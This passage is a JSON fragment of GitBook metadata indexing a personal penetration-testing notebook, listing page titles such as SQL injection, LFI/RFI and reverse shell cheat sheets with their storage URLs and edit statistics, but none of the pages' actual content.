TxhoDPBTEdmlSz2":{"createdAt":1569052913842,"updatedAt":1593517028644,"count":2}},"github":null,"stats":{"words":285,"images":0,"codeLines":61,"revisions":1},"pages":null},"-LpHC_NRnuOvdP32c2CK":{"uid":"-LpHC_NRnuOvdP32c2CK","kind":"document","title":"Powershell","path":"powershell","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LkvnWByFHssLOYr3_77%2F-M48SaYs88X-iCyXPpKu%2Fmaster%2F-LpHC_NRnuOvdP32c2CK%2Fdocument.json?alt=media\u0026token=02540599-e690-4d62-80a4-24cc8971c1bd","createdAt":1569042355740,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1569052913839,"updatedAt":1586081738410,"count":2}},"github":null,"stats":{"words":220,"images":0,"codeLines":6,"revisions":1},"pages":null},"-LpH8SDA-5xNckr4RNWI":{"uid":"-LpH8SDA-5xNckr4RNWI","kind":"document","title":"Basics of windows","path":"basics-of-windows","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LkvnWByFHssLOYr3_77%2F-LpGzvfkZAVkJ6Zj6y7T%2Fmaster%2F-LpH8SDA-5xNckr4RNWI%2Fdocument.json?alt=media\u0026token=9072a115-842b-4592-b151-945c73382413","createdAt":1569041273739,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1569052913839,"updatedAt":1569052913839,"count":1}},"github":null,"stats":{"words":1541,"images":0,"codeLines":113,"revisions":1},"pages":null},"-LlbDkkuNuTe4bps1hqr":{"uid":"-LlbDkkuNuTe4bps1hqr","kind":"document","title":"Linux / WindowsMain commands","path":"linux-main-commands","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LkvnWByFHssLOYr3_77%2F-LlbFIm-DZFsXHMSuFbY%2Fmaster%2F-LlbDkkuNuTe4bps1hqr%2Fdocument.json?alt=media\u0026token=8d0136f4-ce11-4503-93a9-644e87c030da","createdAt":1565100018747,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1565100139501,"updatedAt":1565108220355,"count":2}},"github":null,"stats":{"words":24,"images":0,"codeLines":193,"revisions":2},"pages":null},"-LpH2pMp8WCB2aQg93Ab":{"uid":"-LpH2pMp8WCB2aQg93Ab","kind":"document","title":"Bash Scripting","path":"bash-scripting","href":null,"description":"https://sushant747.gitbooks.io/total-oscp-guide/basics_of_linux.html","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LkvnWByFHssLOYr3_77%2F-M44l_vH2_CLRRu0j9rJ%2Fmaster%2F-LpH2pMp8WCB2aQg93Ab%2Fdocument.json?alt=media\u0026token=c938a8d1-d8f4-4c76-ac56-986d18b45f3b","createdAt":1569039799797,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1569052913842,"updatedAt":1586016412396,"count":2}},"github":null,"stats":{"words":190,"images":0,"codeLines":45,"revisions":1},"pages":null},"-Lkvo-PWMVjllFR5FEMI":{"uid":"-Lkvo-PWMVjllFR5FEMI","kind":"document","title":"Recon (Scanning \u0026 Enumeration)","path":"untitled","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LkvnWByFHssLOYr3_77%2F-M48SaYs88X-iCyXPpKu%2Fmaster%2F-Lkvo-PWMVjllFR5FEMI%2Fdocument.json?alt=media\u0026token=89b2fa74-e713-4f73-82df-a8687b772aeb","createdAt":1564371584674,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1564371676207,"updatedAt":1586081738411,"count":2}},"github":null,"stats":{"words":7,"images":0,"codeLines":0,"revisions":1},"pages":["-LpHNN_qBaUiu6G6snNp","-LpHNyCIS0ukB2cLt3ZK","-LpHNDkZn2cO152iK1hR","-Ll1tCZZZoTYbANAnsc_","-Ll1jQD-Grj9LKhA4nxs","-Ll1dTEHRfUn973tlg0k","-Ll1bgJA5-GhP6CO4km8"]},"-LpHNN_qBaUiu6G6snNp":{"uid":"-LpHNN_qBaUiu6G6snNp","kind":"document","title":"Active Info Gathering","path":"active-info-gathering","href":null,"description":"https://sushant747.gitbooks.io/total-oscp-guide/active_information_gathering.html","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LkvnWByFHssLOYr3_77%2F-MB4-WzBvvM-Pk8nca-E%2Fmaster%2F-LpHNN_qBaUiu6G6snNp%2Fdocument.json?alt=media\u0026token=a6a3978d-bd65-4d4a-bbc4-97c19c81748c","createdAt":1569045186934,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1569052913839,"updatedAt":1593517024737,"count":3}},"github":null,"stats":{"words":49,"images":0,"codeLines":2,"revisions":1},"pages":["-M44vSKdwApWExhSe93o","-M44vw7NM3VIjph64Pin","-Lpy1dhB2U_Xblf5WOn5","-LpHN_gP5ONyLlMunKQc"]},"-M44vSKdwApWExhSe93o":{"uid":"-M44vSKdwApWExhSe93o","kind":"document","title":"My Network Recon Checklist","path":"my-network-recon-checklist","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LkvnWByFHssLOYr3_77%2F-MB4-WzBvvM-Pk8nca-E%2Fmaster%2F-M44vSKdwApWExhSe93o%2Fdocument.json?alt=media\u0026token=96c0a388-e826-474b-819e-878ea937acfc","createdAt":1586016146797,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1586016412387,"updatedAt":1593517020705,"count":4}},"github":null,"stats":{"words":90,"images":0,"codeLines":72,"revisions":0},"pages":null},"-M44vw7NM3VIjph64Pin":{"uid":"-M44vw7NM3VIjph64Pin","kind":"document","title":"My Web Recon Checklist","path":"my-web-recon-checklist","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LkvnWByFHssLOYr3_77%2F-M44l_vH2_CLRRu0j9rJ%2Fmaster%2F-M44vw7NM3VIjph64Pin%2Fdocument.json?alt=media\u0026token=5a6812a7-a8c2-48ca-99f4-de88eeb92a8e","createdAt":1586016272922,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1586016412401,"updatedAt":1586016412401,"count":1}},"github":null,"stats":{"words":0,"images":0,"codeLines":78,"revisions":0},"pages":null},"-Lpy1dhB2U_Xblf5WOn5":{"uid":"-Lpy1dhB2U_Xblf5WOn5","kind":"document","title":"Network Enumeration","path":"network-enumeration","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LkvnWByFHssLOYr3_77%2F-Lpy176VUkdDL-ytFSfd%2Fmaster%2F-Lpy1dhB2U_Xblf5WOn5%2Fdocument.json?alt=media\u0026token=756a1694-fb41-452a-a24f-4cc52f0dfe60","createdAt":1569777687372,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1569777922162,"updatedAt":1569777922162,"count":1}},"github":null,"stats":{"words":0,"images":0,"codeLines":109,"revisions":1},"pages":null},"-LpHN_gP5ONyLlMunKQc":{"uid":"-LpHN_gP5ONyLlMunKQc","kind":"document","title":"Port Scanning","path":"port-scanning","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LkvnWByFHssLOYr3_77%2F-MB4-WzBvvM-Pk8nca-E%2Fmaster%2F-LpHN_gP5ONyLlMunKQc%2Fdocument.json?alt=media\u0026token=9c66601d-415e-4a41-873f-bbfbe8985ddf","createdAt":1569045240602,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1569052913841,"updatedAt":1593517024560,"count":4}},"github":null,"stats":{"words":542,"images":0,"codeLines":50,"revisions":1},"pages":null},"-LpHNyCIS0ukB2cLt3ZK":{"uid":"-LpHNyCIS0ukB2cLt3ZK","kind":"document","title":"Common Ports and Services","path":"common-ports-and-services","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LkvnWByFHssLOYr3_77%2F-MB404MDoZOSXzhk3X2W%2Fmaster%2F-LpHNyCIS0ukB2cLt3ZK%2Fdocument.json?alt=media\u0026token=275aa33c-e847-4aa0-b90d-e0e2ae18bfc4","createdAt":1569045341011,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1569052913839,"updatedAt":1593517385749,"count":5}},"github":null,"stats":{"words":3187,"images":0,"codeLines":191,"revisions":3},"pages":["-Ll1vR3jaU6J9iZElvFj"]},"-Ll1vR3jaU6J9iZElvFj":{"uid":"-Ll1vR3jaU6J9iZElvFj","kind":"document","title":"Other Services Enumeration","path":"other-services-enumeration","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LkvnWByFHssLOYr3_77%2F-MB41T_6lmNbRDVRz5Ej%2Fmaster%2F-Ll1vR3jaU6J9iZElvFj%2Fdocument.json?alt=media\u0026token=24b0afa2-2d37-489f-8958-ae1ab46af769","createdAt":1564490973487,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1564491217967,"updatedAt":1593517637687,"count":6}},"github":null,"stats":{"words":19,"images":0,"codeLines":24,"revisions":5},"pages":null},"-LpHNDkZn2cO152iK1hR":{"uid":"-LpHNDkZn2cO152iK1hR","kind":"document","title":"DNS Zone Transfer Attack","path":"dns-zone-transfer-attack","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LkvnWByFHssLOYr3_77%2F-LpGzvfkZAVkJ6Zj6y7T%2Fmaster%2F-LpHNDkZn2cO152iK1hR%2Fdocument.json?alt=media\u0026token=dbb55762-628c-4253-91d2-73946d117c1b","createdAt":1569045146660,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1569052913842,"updatedAt":1569052913842,"count":1}},"github":null,"stats":{"words":100,"images":0,"codeLines":2,"revisions":1},"pages":null},"-Ll1tCZZZoTYbANAnsc_":{"uid":"-Ll1tCZZZoTYbANAnsc_","kind":"document","title":"SNMP Enumeration","path":"snmp-enumeration","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LkvnWByFHssLOYr3_77%2F-MB41T_6lmNbRDVRz5Ej%2Fmaster%2F-Ll1tCZZZoTYbANAnsc_%2Fdocument.json?alt=media\u0026token=3e5f477f-35dc-4125-9652-5b6b96fc7a2f","createdAt":1564490389796,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1564490549158,"updatedAt":1593517636234,"count":3}},"github":null,"stats":{"words":0,"images":0,"codeLines":20,"revisions":1},"pages":null},"-Ll1jQD-Grj9LKhA4nxs":{"uid":"-Ll1jQD-Grj9LKhA4nxs","kind":"document","title":"SMB Enumeration","path":"smb-enumeration","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LkvnWByFHssLOYr3_77%2F-MB41T_6lmNbRDVRz5Ej%2Fmaster%2F-Ll1jQD-Grj9LKhA4nxs%2Fdocument.json?alt=media\u0026token=569c814d-bedf-4326-a68b-07398fce2540","createdAt":1564487824256,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1564490549158,"updatedAt":1593517636648,"count":5}},"github":null,"stats":{"words":16,"images":0,"codeLines":43,"revisions":3},"pages":null},"-Ll1dTEHRfUn973tlg0k":{"uid":"-Ll1dTEHRfUn973tlg0k","kind":"document","title":"Web Application Directory bruteforcing / fingerprinting","path":"web-application-fingerprinting","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LkvnWByFHssLOYr3_77%2F-MB41T_6lmNbRDVRz5Ej%2Fmaster%2F-Ll1dTEHRfUn973tlg0k%2Fdocument.json?alt=media\u0026token=d999514b-2043-4951-930f-f9b71e38def1","createdAt":1564486263762,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1564490549158,"updatedAt":1593517636459,"count":6}},"github":null,"stats":{"words":25,"images":0,"codeLines":42,"revisions":4},"pages":null},"-Ll1bgJA5-GhP6CO4km8":{"uid":"-Ll1bgJA5-GhP6CO4km8","kind":"document","title":"Port \u0026 Services Scanning","path":"port-and-services-scanning","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LkvnWByFHssLOYr3_77%2F-MB42Nr-TiwQcWgnsYry%2Fmaster%2F-Ll1bgJA5-GhP6CO4km8%2Fdocument.json?alt=media\u0026token=1879a56a-ae6e-42d5-a806-ce2a2db1da39","createdAt":1564485797131,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1564490549158,"updatedAt":1593517918459,"count":4}},"github":null,"stats":{"words":42,"images":0,"codeLines":54,"revisions":3},"pages":null},"-Llb9n_p_sSTobIE0sPP":{"uid":"-Llb9n_p_sSTobIE0sPP","kind":"document","title":"Web Application","path":"web-application","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LkvnWByFHssLOYr3_77%2F-MB42Nr-TiwQcWgnsYry%2Fmaster%2F-Llb9n_p_sSTobIE0sPP%2Fdocument.json?alt=media\u0026token=f5d0ba1f-5155-4510-9b5b-bd56668f91bf","createdAt":1565098981749,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1565099294411,"updatedAt":1593517916569,"count":3}},"github":null,"stats":{"words":27,"images":0,"codeLines":51,"revisions":2},"pages":["-M45Fyc6IaYEgjOmD9hF","-LpHcJUWPh-Q8yG9pS8e","-Lpy2VE93p5BEsjqE_aT","-LpHcBoWTdkiOmjF0DvL","-LpHc0_DBmLcAaZqdsZv","-LpHbuYkeCWyHPvVIhp7","-LpHbVn3jQyKfvdaOvhS","-LpHaLUGNlVtaPs2UTnU"]},"-M45Fyc6IaYEgjOmD9hF":{"uid":"-M45Fyc6IaYEgjOmD9hF","kind":"document","title":"My checklist","path":"my-checklist","href":null,"description":"","documentURL":null,"createdAt":1586021788167,"edits":{},"github":null,"stats":{"words":0,"images":0,"codeLines":0,"revisions":0},"pages":["-M45GeqSgmaaQYedylDF","-M45GWlI9eYGuYiMRrPO","-M45G5QyEhD74lv9qdfv"]},"-M45GeqSgmaaQYedylDF":{"uid":"-M45GeqSgmaaQYedylDF","kind":"document","title":"LFI","path":"lfi","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LkvnWByFHssLOYr3_77%2F-MB42Nr-TiwQcWgnsYry%2Fmaster%2F-M45GeqSgmaaQYedylDF%2Fdocument.json?alt=media\u0026token=60079fa3-bdf9-412b-9013-95b51a7ed89e","createdAt":1586021969309,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1586022489755,"updatedAt":1593517916507,"count":2}},"github":null,"stats":{"words":4,"images":0,"codeLines":151,"revisions":0},"pages":null},"-M45GWlI9eYGuYiMRrPO":{"uid":"-M45GWlI9eYGuYiMRrPO","kind":"document","title":"RFI","path":"rfi","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LkvnWByFHssLOYr3_77%2F-MB42Nr-TiwQcWgnsYry%2Fmaster%2F-M45GWlI9eYGuYiMRrPO%2Fdocument.json?alt=media\u0026token=894af8c0-ef56-4ec3-a5d4-77ee5fc3403e","createdAt":1586021932115,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1586022489645,"updatedAt":1593517916360,"count":2}},"github":null,"stats":{"words":0,"images":0,"codeLines":22,"revisions":0},"pages":null},"-M45G5QyEhD74lv9qdfv":{"uid":"-M45G5QyEhD74lv9qdfv","kind":"document","title":"SQLI","path":"sqli","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LkvnWByFHssLOYr3_77%2F-M45DNbLcWG-8Fe-sDMe%2Fmaster%2F-M45G5QyEhD74lv9qdfv%2Fdocument.json?alt=media\u0026token=12a7b8c9-cb8e-40ac-bbf4-dc0722101a0c","createdAt":1586021820158,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1586022489664,"updatedAt":1586022489664,"count":1}},"github":null,"stats":{"words":6,"images":0,"codeLines":185,"revisions":0},"pages":null},"-LpHcJUWPh-Q8yG9pS8e":{"uid":"-LpHcJUWPh-Q8yG9pS8e","kind":"document","title":"File Upload bypass","path":"file-upload-bypass","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LkvnWByFHssLOYr3_77%2F-LpGzvfkZAVkJ6Zj6y7T%2Fmaster%2F-LpHcJUWPh-Q8yG9pS8e%2Fdocument.json?alt=media\u0026token=942c8640-dd8d-4124-a9b7-a102aceeb0bb","createdAt":1569049364449,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1569052913850,"updatedAt":1569052913850,"count":1}},"github":null,"stats":{"words":183,"images":0,"codeLines":5,"revisions":1},"pages":null},"-Lpy2VE93p5BEsjqE_aT":{"uid":"-Lpy2VE93p5BEsjqE_aT","kind":"document","title":"Enumeration and Exploitation","path":"enumeration-and-exploitation","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LkvnWByFHssLOYr3_77%2F-MB43RyruAOnYGmBeX5p%2Fmaster%2F-Lpy2VE93p5BEsjqE_aT%2Fdocument.json?alt=media\u0026token=10c39ecf-475a-41a9-9a4f-85fe47fa07f5","createdAt":1569777910731,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1569777922162,"updatedAt":1593519481416,"count":2}},"github":null,"stats":{"words":0,"images":0,"codeLines":91,"revisions":1},"pages":null},"-LpHcBoWTdkiOmjF0DvL":{"uid":"-LpHcBoWTdkiOmjF0DvL","kind":"document","title":"No-Sql Injection","path":"no-sql-injection","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LkvnWByFHssLOYr3_77%2F-LpGzvfkZAVkJ6Zj6y7T%2Fmaster%2F-LpHcBoWTdkiOmjF0DvL%2Fdocument.json?alt=media\u0026token=589bf325-a9b4-4596-a665-1f888804ac76","createdAt":1569049333026,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1569052913841,"updatedAt":1569052913841,"count":1}},"github":null,"stats":{"words":32,"images":0,"codeLines":1,"revisions":1},"pages":null},"-LpHc0_DBmLcAaZqdsZv":{"uid":"-LpHc0_DBmLcAaZqdsZv","kind":"document","title":"SQL Injection","path":"sql-injection","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LkvnWByFHssLOYr3_77%2F-MB43RyruAOnYGmBeX5p%2Fmaster%2F-LpHc0_DBmLcAaZqdsZv%2Fdocument.json?alt=media\u0026token=21e34d33-bd15-48ef-ba8b-ef3154421670","createdAt":1569049286990,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1569052913840,"updatedAt":1593519480953,"count":2}},"github":null,"stats":{"words":999,"images":0,"codeLines":94,"revisions":1},"pages":null},"-LpHbuYkeCWyHPvVIhp7":{"uid":"-LpHbuYkeCWyHPvVIhp7","kind":"document","title":"Hidden Files and directories","path":"hidden-files-and-directories","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LkvnWByFHssLOYr3_77%2F-MB43RyruAOnYGmBeX5p%2Fmaster%2F-LpHbuYkeCWyHPvVIhp7%2Fdocument.json?alt=media\u0026token=1836e5be-7011-4bf6-b096-d9be77a1422b","createdAt":1569049258224,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1569052913840,"updatedAt":1593519479643,"count":2}},"github":null,"stats":{"words":180,"images":0,"codeLines":12,"revisions":1},"pages":null},"-LpHbVn3jQyKfvdaOvhS":{"uid":"-LpHbVn3jQyKfvdaOvhS","kind":"document","title":"RFI","path":"rfi","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LkvnWByFHssLOYr3_77%2F-MB43RyruAOnYGmBeX5p%2Fmaster%2F-LpHbVn3jQyKfvdaOvhS%2Fdocument.json?alt=media\u0026token=8b87b1b8-dc4e-488e-9fa3-afe99e1dc8ee","createdAt":1569049152708,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1569052913839,"updatedAt":1593519479515,"count":2}},"github":null,"stats":{"words":178,"images":0,"codeLines":7,"revisions":1},"pages":null},"-LpHaLUGNlVtaPs2UTnU":{"uid":"-LpHaLUGNlVtaPs2UTnU","kind":"document","title":"LFI","path":"lfi","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LkvnWByFHssLOYr3_77%2F-MB43RyruAOnYGmBeX5p%2Fmaster%2F-LpHaLUGNlVtaPs2UTnU%2Fdocument.json?alt=media\u0026token=32ff9be5-2247-44c2-9596-3350a7206c4c","createdAt":1569048848338,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1569052913839,"updatedAt":1593519479630,"count":2}},"github":null,"stats":{"words":552,"images":0,"codeLines":90,"revisions":1},"pages":null},"-Ll1wF0eYq0aUyTOTckh":{"uid":"-Ll1wF0eYq0aUyTOTckh","kind":"document","title":"Brute Force","path":"brute-force","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LkvnWByFHssLOYr3_77%2F-MB49Tq4Opxj9HMfcdJ_%2Fmaster%2F-Ll1wF0eYq0aUyTOTckh%2Fdocument.json?alt=media\u0026token=b4c9413f-cb06-42e4-ae28-91b05f00001c","createdAt":1564491186282,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1564491217966,"updatedAt":1593519646548,"count":5}},"github":null,"stats":{"words":152,"images":0,"codeLines":16,"revisions":4},"pages":["-LpHpDEKMi4XAxMPW_lP","-Lpy1AfQjFJhSi59_ngM"]},"-LpHpDEKMi4XAxMPW_lP":{"uid":"-LpHpDEKMi4XAxMPW_lP","kind":"document","title":"Reuse the hash","path":"reuse-the-hash","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LkvnWByFHssLOYr3_77%2F-LpGzvfkZAVkJ6Zj6y7T%2Fmaster%2F-LpHpDEKMi4XAxMPW_lP%2Fdocument.json?alt=media\u0026token=16ed6384-1e77-458a-9ce8-72c1901ad970","createdAt":1569052746709,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1569052913842,"updatedAt":1569052913842,"count":1}},"github":null,"stats":{"words":98,"images":0,"codeLines":6,"revisions":1},"pages":null},"-Lpy1AfQjFJhSi59_ngM":{"uid":"-Lpy1AfQjFJhSi59_ngM","kind":"document","title":"Password Crack","path":"password-crack","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LkvnWByFHssLOYr3_77%2F-Lpy176VUkdDL-ytFSfd%2Fmaster%2F-Lpy1AfQjFJhSi59_ngM%2Fdocument.json?alt=media\u0026token=c9f10d3a-5214-424c-8b56-2fa09bc46579","createdAt":1569777564380,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1569777922163,"updatedAt":1569777922163,"count":1}},"github":null,"stats":{"words":0,"images":0,"codeLines":53,"revisions":1},"pages":null},"-LpHnJZ2dtVhnWpNCzmu":{"uid":"-LpHnJZ2dtVhnWpNCzmu","kind":"document","title":"Shells","path":"shells","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LkvnWByFHssLOYr3_77%2F-MB4A3U_rQhRnIKmvYfD%2Fmaster%2F-LpHnJZ2dtVhnWpNCzmu%2Fdocument.json?alt=media\u0026token=f9c6928d-68c2-4864-8aa6-1a5f4664cf59","createdAt":1569052248323,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1569052913841,"updatedAt":1593519989304,"count":3}},"github":null,"stats":{"words":174,"images":0,"codeLines":44,"revisions":1},"pages":["-LkyaCVof0JZkZQFe84E","-LkybKEVE0NX_GoYM6PO","-Lxeh8brG7P1TQxI0X8K","-LpHnQGuAaB_Gv9ZQwy8"]},"-LkyaCVof0JZkZQFe84E":{"uid":"-LkyaCVof0JZkZQFe84E","kind":"document","title":"Linux Reverse Shell  [One liner]","path":"linux-reverse-shell-one-liner","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LkvnWByFHssLOYr3_77%2F-MB4BNRhxyuDpDek2T2F%2Fmaster%2F-LkyaCVof0JZkZQFe84E%2Fdocument.json?alt=media\u0026token=1aa7253b-6121-484a-8bb9-29f9baf7411d","createdAt":1564418299957,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1564418348610,"updatedAt":1593520607238,"count":6}},"github":null,"stats":{"words":65,"images":0,"codeLines":35,"revisions":5},"pages":null},"-LkybKEVE0NX_GoYM6PO":{"uid":"-LkybKEVE0NX_GoYM6PO","kind":"document","title":"Reverse Shell to fully interactive","path":"reverse-shell-to-fully-interactive","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LkvnWByFHssLOYr3_77%2F-M45IhtHiYTtsofFLzOl%2Fmaster%2F-LkybKEVE0NX_GoYM6PO%2Fdocument.json?alt=media\u0026token=afa83d26-c8e3-4921-9de4-7d4242c2506e","createdAt":1564418593760,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1564418685357,"updatedAt":1586023754372,"count":3}},"github":null,"stats":{"words":41,"images":1,"codeLines":26,"revisions":2},"pages":null},"-Lxeh8brG7P1TQxI0X8K":{"uid":"-Lxeh8brG7P1TQxI0X8K","kind":"document","title":"Reverse Shell Cheat Sheet","path":"reverse-shell-cheat-sheet","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LkvnWByFHssLOYr3_77%2F-MB4BNRhxyuDpDek2T2F%2Fmaster%2F-Lxeh8brG7P1TQxI0X8K%2Fdocument.json?alt=media\u0026token=e09d13fe-4b53-49ea-ad76-760967b22977","createdAt":1578043218423,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1578043713937,"updatedAt":1593520607846,"count":2}},"github":null,"stats":{"words":238,"images":0,"codeLines":125,"revisions":1},"pages":null},"-LpHnQGuAaB_Gv9ZQwy8":{"uid":"-LpHnQGuAaB_Gv9ZQwy8","kind":"document","title":"WebShell","path":"webshell","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LkvnWByFHssLOYr3_77%2F-MB4BNRhxyuDpDek2T2F%2Fmaster%2F-LpHnQGuAaB_Gv9ZQwy8%2Fdocument.json?alt=media\u0026token=c7f9e1bc-414c-42e4-84cd-ff5828fa9e47","createdAt":1569052275834,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1569052913848,"updatedAt":1593520605749,"count":3}},"github":null,"stats":{"words":155,"images":0,"codeLines":37,"revisions":1},"pages":null},"-LkvpWVq67p8I85Aouw0":{"uid":"-LkvpWVq67p8I85Aouw0","kind":"document","title":"Transferring files","path":"transferring-files","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LkvnWByFHssLOYr3_77%2F-MB4BNRhxyuDpDek2T2F%2Fmaster%2F-LkvpWVq67p8I85Aouw0%2Fdocument.json?alt=media\u0026token=c17d04ab-f68f-4e5d-8f19-e02fc9ea6ae1","createdAt":1564371982391,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1565108220357,"updatedAt":1593520590624,"count":4}},"github":null,"stats":{"words":8,"images":0,"codeLines":4,"revisions":2},"pages":["-M45CqcOCL1A9M9tKPrA","-LpHFiW77L8u8OsNLSn5"]},"-M45CqcOCL1A9M9tKPrA":{"uid":"-M45CqcOCL1A9M9tKPrA","kind":"document","title":"My 